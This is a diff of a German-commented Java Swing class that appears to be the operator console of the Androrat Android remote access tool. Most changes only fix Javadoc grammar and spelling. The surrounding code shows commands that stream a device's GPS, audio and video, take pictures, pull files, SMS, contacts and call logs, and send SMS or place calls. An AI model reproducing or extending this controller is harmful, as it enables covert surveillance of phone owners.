@@ -54,7 +54,7 @@ import java.awt.Dimension;
 import java.awt.Font;
 
 /**
- * Diese Klasse ist zum Verwalten und Erstellen der GUI die zu Begin des Programmes dargestellt wird.
+ * Diese Klasse ist zum Verwalten und Erstellen der GUI, die zu Begin des Programmes dargestellt wird.
  */
 public class GUI extends javax.swing.JFrame {
 	
@@ -86,7 +86,7 @@ public class GUI extends javax.swing.JFrame {
     private boolean downloadComplete = false;
 
     /**
-     * Der Konsturktor der Klasse erstellt die GUI und gibt eine LogNachricht aus
+     * Der Konsturktor der Klasse erstellt die GUI und gibt eine LogNachricht aus.
      * @param server    Der Server
      * @param port  Der Port
      */
@@ -119,21 +119,21 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
 
     /**
-     * Zum Erstellen vnon Fehlernachrichten. Diese werden hier dem Panel hinzugeüfgt
+     * Zum Erstellen von Fehlernachrichten. Diese werden hier dem Panel hinzugeüfgt.
      * @param txt   Der Text
      */
     public void logErrTxt(String txt) {
     	logPanel.append(Color.red, (new Date(System.currentTimeMillis())+ " "+txt+"\n"));
     }
     /**
-     * Zum Erstellen vnon Lognachrichten. Diese werden hier dem Panel hinzugeüfgt
+     * Zum Erstellen von Lognachrichten. Diese werden hier dem Panel hinzugefügt.
      * @param txt   Der Text
      */
     public void logTxt(String txt) {
     	logPanel.append(Color.black, (new Date(System.currentTimeMillis())+ " "+txt+"\n"));
     }
     /**
-     * Zum Erstellen vnon Lognachrichten des Clients. Diese werden hier dem Panel hinzugeüfgt
+     * Zum Erstellen von Lognachrichten des Clients. Diese werden hier dem Panel hinzugefügt.
      * @param txt   Der Text
      */
     public void clientLogTxt(String imei, long date, String txt) {
@@ -141,7 +141,7 @@ public class GUI extends javax.swing.JFrame {
     	//logPanel.append(Color.gray, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
     }
     /**
-     * Zum Erstellen vnon Fehlernachrichten des Client. Diese werden hier dem Panel hinzugeüfgt
+     * Zum Erstellen von Fehlernachrichten des Client. Diese werden hier dem Panel hinzugefügt
      * @param txt   Der Text
      */
     public void clientErrLogTxt(String imei, long date, String txt) {
@@ -156,8 +156,8 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
 
     /**
-     * Diese Methode wird aufgerufen wenn der button Exit gedrückt wird.
-     * Hier werden dann die Disconnect Informationen an den Client gesendent, in dem im Portocol das DISCONNECT Flag gesetzt wird.
+     * Diese Methode wird aufgerufen, wenn der Button Exit gedrückt wird.
+     * Hier werden dann die Disconnect Informationen an den Client gesendent, in dem im Portocol die DISCONNECT Flag gesetzt wird.
      */
     private void buttonStartActionPerformed() {
     	try {
@@ -173,8 +173,8 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode wird aufgerufen wenn ein User ausgewählt wurde und Open User Interface gedrückt wird.
-     * Danach wird eine neue USERGui erstellt um genauere Informationen über das Gerät zu erhalten.
+     * Diese Methode wird aufgerufen, wenn ein User ausgewählt wurde und Open User Interface gedrückt wird.
+     * Danach wird eine neue USERGui erstellt, um genauere Informationen über das Gerät zu erhalten.
      */
     private void buttonUserGUIActionPerformed() {
     	int row = userTable.getSelectedRow();
@@ -197,8 +197,8 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode wird verwendent wenn die Schlatfläche Disconnet User gedrückt wird.
-     * Sollte dies der Fall sein so wird das Objekt aud er UserTabel zu entfernen und es wird ein Paket mit dem Flag DISCONNECT an den Client gesendet.
+     * Diese Methode wird verwendent, wenn die Schlatfläche Disconnet User gedrückt wird.
+     * Sollte dies der Fall sein, wird das Objekt aus der UserTabel zu entfernen und es wird ein Paket mit dem Flag DISCONNECT an den Client gesendet.
      * Zum Schluss wird die deleteUser Methode aufgerufen.
      */
     private void buttonRemoveUserActionPerformed() {
@@ -215,7 +215,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode wird aufgerufen wenn die Schlatfläche About Androrat gedrückt wird.
+     * Diese Methode wird aufgerufen, wenn die Schlatfläche About Androrat gedrückt wird.
      * Hier wird dann eine DialogBox geöffnet in der die Informationen stehen.
      */
     private void buttonAboutActionPerformed() {
@@ -226,7 +226,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode wird aufgerufen wenn die Schaltfläche Show Logs gedrückt wird.
+     * Diese Methode wird aufgerufen, wenn die Schaltfläche Show Logs gedrückt wird.
      * Dementsprechend wird das Log Panel entweder versteckt oder angezeigt.
      */
     private void buttonShowLogs() {
@@ -268,7 +268,7 @@ public class GUI extends javax.swing.JFrame {
     }*/
 
     /**
-     * Diese Methode wird benutzt um einen neuen User zu erstellen und diese hinzuzufügen.
+     * Diese Methode wird benutzt um einen neuen User zu erstellen und diese zu speichern.
      * @param imei  Die IMEI
      * @param countryCode   Die Länderkennung
      * @param telNumber Die Telefonnummer
@@ -290,16 +290,16 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Klasse ist zum Erstellen und verwenden der Länderflagen vorhanden
+     * Diese Klasse ist zum Erstellen und verwenden der Länderflagen vorhanden.
      */
 	public class MyRenderer extends DefaultTableCellRenderer
 	{
         /**
-         * Diese Methode ist zum Anzeigen der Länderflage vorhanden
+         * Diese Methode ist zum Anzeigen der Länderflage vorhanden.
          * @param table Die Tabelle
          * @param value Die Länderkennung
-         * @param isSelected
-         * @param hasFocus
+         * @param isSelected Diese Varibale wird in der Methdoe nicht verwendet.
+         * @param hasFocus Diese Varibale wird in der Methdoe nicht verwendet.
          * @param row   Die Reihe
          * @param column    Die Zeile
          * @return  Das Obejkt
@@ -327,8 +327,8 @@ public class GUI extends javax.swing.JFrame {
     //-------------------------------------------------
 
     /**
-     * Diese Methode ist zum Entfernen der Clients mit der Imei gedacht.
-     * Hierzu wird der USer entfernt die Usergui unsichtbar gemacht und gelöscht.
+     * Diese Methode ist zum Entfernen des Clients, welcher durch die IMEI identifiziert wird.
+     * Hierzu wird der User entfernt, die Usergui unsichtbar gemacht und gelöscht.
      * @param imei  Die IMEI.
      */
     public void deleteUser(String imei) {
@@ -343,7 +343,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Schließen der UserGui mit der IMEI. Um dies zu tun wird die GUI aus der GuiMap entfernt.
+     * Diese Methode ist zum Schließen der UserGui des Geräts mit der IMEI. Um dies zu tun, wird die GUI aus der GuiMap entfernt.
      * @param imei Die IMEI
      */
     public void closeUserGUI(String imei) {
@@ -366,7 +366,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Erhält die Daten gibt sie an die entsprechende UserGui und den richtige Anzeige tab weiter.
+     * Erhält die Datena und gibt sie an die entsprechende UserGui und das richtige Anzeigetab weiter.
      * Zum Updaten der Informationen
      * @param imei  Die IMEI
      * @param ip    DIe Ip
@@ -407,7 +407,7 @@ public class GUI extends javax.swing.JFrame {
 
     /**
      * Diese Methode ist zum Aktualisieren des Soundtabs vorhanden. Hier werden dann die neuen Daten abgespielt.
-     * Dazu wird die richtige UserGui per imei Idetifiziert und die addSoundBytes Methode aufgerufen.
+     * Dazu wird die richtige UserGui per IMEI Idetifiziert und die addSoundBytes Methode aufgerufen.
      * @param imei  Die IMEI
      * @param data  Die Daten
      */
@@ -417,7 +417,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Weiterleiten der neuen Videodaten an die richtige userGui da.
+     * Diese Methode ist zum Weiterleiten der neuen Videodaten an die richtige UserGui.
      * @param imei  Die IMEI
      * @param data  Die Videodaten
      */
@@ -427,7 +427,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Aktualisieren der Daten des FileTreeTabs da.
+     * Diese Methode ist zum Aktualisieren der Daten des FileTreeTabs.
      * Es wird die entsprechende UserGui ausgesucht und dann die Updatemethode des Panels aufgerufen.
      * @param imei  Die IMEI
      * @param fileList  Die Ordnerstruktur
@@ -448,8 +448,8 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Aktualisieren der Daten der GUI sobald neue Daten am Server ankommen.
-     * Es wird dann die UserGUI mit der IMEI herausgeuscht und die Updatemethode des entsprechendn Tabs aufgerufen.
+     * Diese Methode ist zum Aktualisieren der Kontaktdaten.
+     * Es wird dann die UserGUI mit der IMEI herausgesucht und die Updatemethode des entsprechendn Tabs aufgerufen.
      * @param imei  Die IMEI
      * @param contacts  Die Kontakte
      */
@@ -459,7 +459,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Hinzufügen eine neuen Anrufs vorhanden. Damit dies in der richtige UserGui geschieht wird diese mit der IMEI idetifiziert und die Updatemethode des entsprechenden Tabs aufgerufen.
+     * Diese Methode ist zum Hinzufügen eine neuen Anrufs vorhanden. Damit dies in der richtige UserGui geschieht, wird diese mit der IMEI idetifiziert und die Updatemethode des entsprechenden Tabs aufgerufen.
      * @param imei  Die IMEI
      * @param type  Die Art des Anrufs
      * @param phoneNumber   Die Telefonnummer
@@ -497,7 +497,7 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die GPSDaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die GPSDaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -507,7 +507,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die Anruflistendaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die Anruflistendaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -517,7 +517,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die Kontaktdaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die Kontaktdaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -527,7 +527,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die Smsmonitordaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die Smsmonitordaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -537,7 +537,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die Anruflistendaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die Anruflistendaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -547,7 +547,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die Bilddaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die Bilddaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -557,7 +557,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die Audiodaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die Audiodaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -567,7 +567,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die Videodaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die Videodaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -577,7 +577,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Speichern des Datenkanals für die SMSDaten in der UserGui vorhanden. Die UserGui wird per IMEI ausgewählt
+     * Diese Methode ist zum Speichern des Datenkanals für die SMSDaten. Die UserGui wird per IMEI ausgewählt.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -591,7 +591,7 @@ public class GUI extends javax.swing.JFrame {
     // *******************************
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um die Advanced Informations und die Einstellungen zu erhalten.
+     * Diese Methode ist zum Senden der Anfrage, um die Advanced Informations und die Einstellungen zu erhalten.
      * @param imei  Die IMEI
      */
     public void fireGetAdvInformations(String imei) {
@@ -600,7 +600,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Die Methode ist zum Senden der Anfrage um die SMS zu erhalten. der String req sind die Filter nachdenen die SMS gefiltert werden sollen.
+     * Die Methode ist zum Senden der Anfrage, um die SMS zu erhalten. Der String req sind die Filter nach denen die SMSListe gefiltert werden soll.
      * @param imei  Die IMEI
      * @param req   Die Filter
      */
@@ -609,7 +609,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um den GPS Stream zu aktivieren.
+     * Diese Methode ist zum Senden der Anfrage, um den GPS Stream zu aktivieren.
      * @param imei  Die IMEI
      * @param provider  Der Provider des Quelle
      */
@@ -618,7 +618,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um den GPS Stream zu stoppen.
+     * Diese Methode ist zum Senden der Anfrage, um den GPS Stream zu stoppen.
      * @param imei  Die IMEI
      * @param channel   Der Kanal
      */
@@ -627,7 +627,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um den Sound Stream zu aktivieren.
+     * Diese Methode ist zum Senden der Anfrage, um den Sound Stream zu aktivieren.
      * @param imei  Die IMEI
      * @param source    Die Quelle des Sounds
      */
@@ -637,7 +637,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um den Sound Stream zu stoppen.
+     * Diese Methode ist zum Senden der Anfrage, um den Sound Stream zu stoppen.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -646,7 +646,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um den Video Stream zu aktivieren.
+     * Diese Methode ist zum Senden der Anfrage, um den Video Stream zu aktivieren.
      * @param imei  Die IMEI
      */
     public void fireStartVideoStream(String imei, byte[] cam) {
@@ -654,7 +654,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um den Video Stream zu stoppen.
+     * Diese Methode ist zum Senden der Anfrage, um den Video Stream zu stoppen.
      * @param imei  Die IMEI
      * @param channel   Der Kanal
      */
@@ -664,7 +664,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um ein Bild aufzunehmen.
+     * Diese Methode ist zum Senden der Anfrage, um ein Bild aufzunehmen.
      * @param imei Die IMEI
      */
     public void fireTakePicture(String imei,String cam) {
@@ -680,7 +680,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um einen Ordner herunterzuladen.
+     * Diese Methode ist zum Senden der Anfrage, um einen Ordner herunterzuladen.
      * @param imei  Die IMEI
      * @param path  Der Pfad
      * @param downPath  Der Downpfad
@@ -691,7 +691,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um die Ordnerstruktur zu erhalten.
+     * Diese Methode ist zum Senden der Anfrage, um die Ordnerstruktur zu erhalten.
      * @param imei  Die IMEI
      */
     public void fireTreeFile(String imei) {
@@ -699,7 +699,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um ein Toast abzusetzen.
+     * Diese Methode ist zum Senden der Anfrage, um ein Toast abzusetzen.
      * @param imei  Die IMEI
      * @param txt   Der Text des Toasts
      */
@@ -708,7 +708,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um das Gerät eine bestimmte Zeit vibrieren zu lassen.
+     * Diese Methode ist zum Senden der Anfrage, um das Gerät eine bestimmte Zeit vibrieren zu lassen.
      * @param imei  Die IMEI
      * @param duration  Die Dauer in Millisekunden
      */
@@ -717,7 +717,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um eine bestimmte Webseite auf dem Gerät zu öffnen.
+     * Diese Methode ist zum Senden der Anfrage, um eine bestimmte Webseite auf dem Gerät zu öffnen.
      * @param imei  Die IMEI
      * @param url   Die Url der Webseite
      */
@@ -726,7 +726,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um eine SMS zu senden.
+     * Diese Methode ist zum Senden der Anfrage, um eine SMS zu senden.
      * @param imei  DIe IMEI
      * @param map   Die Sms Daten
      */
@@ -736,7 +736,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um eine Anruf auf dem Gerät abzusetzen.
+     * Diese Methode ist zum Senden der Anfrage, um eine Anruf auf dem Gerät abzusetzen.
      * @param imei  Die IMEI
      * @param target    Die Telefonnummer
      */
@@ -745,7 +745,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um die Anrufliste zu erhalten.
+     * Diese Methode ist zum Senden der Anfrage, um die Anrufliste zu erhalten.
      * @param imei  Die IMEI
      * @param request   Die Filter für die Liste.
      */
@@ -754,7 +754,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um die Kontakte zu erhalten.
+     * Diese Methode ist zum Senden der Anfrage, um die Kontakte zu erhalten.
      * @param imei  Die IMEI
      */
     public void fireContacts(String imei) {
@@ -762,7 +762,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um das Monitoren von Anrufen zu starten.
+     * Diese Methode ist zum Senden der Anfrage ,um das Monitoren von Anrufen zu starten.
      * @param imei  Die IMEI
      * @param phoneNumbers  Die Telefonnummern nachdenen gefiltert werden soll.
      */
@@ -771,7 +771,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um das Monitoren von Anrufen zu stoppen.
+     * Diese Methode ist zum Senden der Anfrage, um das Monitoren von Anrufen zu stoppen.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -780,7 +780,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um das Monitoren von SMS zu starten.
+     * Diese Methode ist zum Senden der Anfrage, um das Monitoren von SMS zu starten.
      * @param imei  Die IMEI
      * @param phoneNumbers  Die Telefonnummern nach denen gefiltert wird.
      */
@@ -789,7 +789,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden der Anfrage um das Monitoren von SMS zu stoppen.
+     * Diese Methode ist zum Senden der Anfrage, um das Monitoren von SMS zu stoppen.
      * @param imei  Die IMEI
      * @param channel   Der Datenkanal
      */
@@ -797,17 +797,30 @@ public class GUI extends javax.swing.JFrame {
     	server.commandStopSender(imei, Protocol.STOP_MONITOR_SMS, null, channel);
     }
 
+    /**
+     * Diese Methode ist zum Senden der Anfrage, um das Blitzlich zu aktivieren.
+     * @param imei  Die IMEI
+     */
     public void fireTorchOn(String imei){
         server.commandSender(imei, Protocol.TORCH,null);
     }
 
+    /**
+     * Diese Methode ist zum Senden der Anfrage, um das Blitzlicht zu deaktivieren.
+     * @param imei Die IMEI
+     */
     public void fireTorchOff(String imei){
         server.commandSender(imei,Protocol.STOP_TORCH,null);
     }
 
+    /**
+     * Diese Methode ist zum Senden der Anfrage, um den Alarm zu erstellen.
+     * @param imei Die IMEI
+     * @param args  Die Uhrzeit.
+     */
     public void fireAlarm(String imei, byte[] args){ server.commandSender(imei, Protocol.SET_ALARM, args);}
     /**
-     * Diese Methode ist zum Senden der Anfrage um die Konfiguration zu speichern.
+     * Diese Methode ist zum Senden der Anfrage, um die Konfiguration zu speichern.
      * @param imei  Die IMEI
      * @param ip    Die IP
      * @param port  Der Port
@@ -823,7 +836,7 @@ public class GUI extends javax.swing.JFrame {
 
 
     /**
-     * Diese Methode ist zum Absetzen des Toast zuständig. Hier wird der Dialog erstellt und die eingelesenen Daten im Anschluss per FireToastMessage abgesendet.
+     * Diese Methode ist zum Absetzen eines Toasts zuständig. Hier wird der Dialog erstellt und die eingelesenen Daten im Anschluss per FireToastMessage abgesendet.
      */
     private void fireBulkToast() {
     	String txt = JOptionPane.showInputDialog(this, "Enter your text :");
@@ -836,7 +849,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum Senden einer SMS. Hier wird der SMSdialog gestartet und im Anschluss wird die SMS versendet.
+     * Diese Methode ist zum Senden einer SMS. Hier wird der SMSdialog gestartet und im Anschluss wird die Anfrage eine SMS zuversenden abgesetzt.
      */
     private void fireBulkSMS() {
     	SMSDialog dialog = new SMSDialog(this);
@@ -874,7 +887,7 @@ public class GUI extends javax.swing.JFrame {
     }
 
     /**
-     * Diese Methode ist zum erkennen ob und wo geklickt wurde.
+     * Diese Methode ist zum Erkennen, ob und wo geklickt wurde.
      * @param e Das Event
      */
     private void userMouseClicked(MouseEvent e) {
@@ -885,7 +898,7 @@ public class GUI extends javax.swing.JFrame {
 
 
     /**
-     * Diese Funtkion ist zum erstellen der GUI. Hier werden die unterschiedlichen Schaltflächen erstellt und positioniert.
+     * Diese Funtkion ist zum Erstellen der GUI. Hier werden die unterschiedlichen Schaltflächen erstellt und positioniert.
      */
     private void initComponents() {
     	
